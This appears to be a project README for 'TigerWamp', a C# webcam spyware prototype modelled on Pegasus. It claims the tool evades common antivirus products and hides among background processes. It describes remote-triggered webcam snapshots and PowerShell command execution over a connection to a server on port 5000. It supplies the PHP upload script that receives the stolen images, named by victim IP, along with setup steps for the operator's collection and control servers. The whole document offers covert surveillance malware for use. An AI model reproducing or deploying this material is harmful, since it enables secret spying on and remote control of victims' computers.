# TigerWamp Spyware
TigerWamp is a prototype camera spyware written in c# inspired by Pegasus!

At the time of publication, it could bypass Norton, MalwareBytes, and VirusTotal.
It runs as an invisible WPF application that hides in the middle of the background processes list.

To use it you need your own webserver with directory "uploads/" and a php file "upload.php" with contents:

```php
<?php
$uploads_dir = './uploads/'; //Directory to save the file that comes from client application.

if ($_FILES["file"]["error"] == UPLOAD_ERR_OK) {
    $tmp_name = $_FILES["file"]["tmp_name"];
    $name = $_FILES["file"]["name"];
    move_uploaded_file($tmp_name, "$uploads_dir/" . base64_encode($_SERVER['REMOTE_ADDR'] .".{" . time() . "}") . ".zip");
    echo "Ok.";
}
?> 
```
The spyware takes snapshots from the webcam (opencv cam 0). The camera photos can be trigger remotely with the 'cam' command. It will try to connect to a remote server on tcp/5000 (Change as needed). It also supports powershell command execution (if your good). More features coming soon.

# Recommended
Add this to your .htaccess file:
```.htaccess
RedirectMatch 404 ^/uploads/?$
```
It will make sure that only the owners of the webserver can access the content.

# Required for operation
1. Make sure you have your own http server (with php) that will accept files. Change this I don't want your data!!!
2. Make sure that you have your own server that can accept connections. Currently it uses my linode server IP!
